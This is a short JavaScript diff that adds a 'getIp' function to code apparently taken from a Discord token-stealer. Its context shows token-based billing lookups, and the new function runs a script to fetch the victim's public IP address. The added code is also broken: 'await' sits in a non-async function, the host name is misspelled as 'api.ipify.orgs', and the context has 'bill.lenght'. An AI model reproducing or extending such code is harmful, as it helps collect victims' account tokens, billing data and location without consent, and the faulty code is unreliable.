@@ -490,6 +490,14 @@ const fetchBilling = async (token) => {
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
+function getIp() {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", "https://api.ipify.orgs", false);
+    xmlHttp.send(null);
+    xmlHttp.responseText`);
+  return JSON.parse(bill);
+};
+
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (!data) return '❌';
